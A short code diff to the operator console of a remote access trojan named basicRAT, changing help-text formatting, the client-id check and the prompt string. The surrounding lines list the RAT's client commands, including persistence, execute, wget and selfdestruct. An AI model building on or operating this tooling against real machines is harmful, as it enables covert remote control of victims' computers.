@@ -29,8 +29,7 @@ BANNER = '''
 '''
 CLIENT_COMMANDS = [ 'cat', 'execute', 'ls', 'persistence', 'pwd', 'scan',
                     'selfdestruct', 'survey', 'unzip', 'wget' ]
-HELP_TEXT = '''
-Command             | Description
+HELP_TEXT = '''Command             | Description
 ---------------------------------------------------------------------------
 cat <file>          | Output a file to the screen.
 client <id>         | Connect to a client.
@@ -189,12 +188,12 @@ def main():
     readline.set_completer(completer)
 
     while True:
-        try:
+        if server.current_client:
             ccid = server.current_client.uid
-        except AttributeError:
+        else:
             ccid = '?'
 
-        prompt = raw_input('\n[{}] basicRAT> '.format(ccid)).rstrip()
+        prompt = raw_input('[{}] basicRAT> '.format(ccid)).rstrip()
 
         # allow noop
         if not prompt:
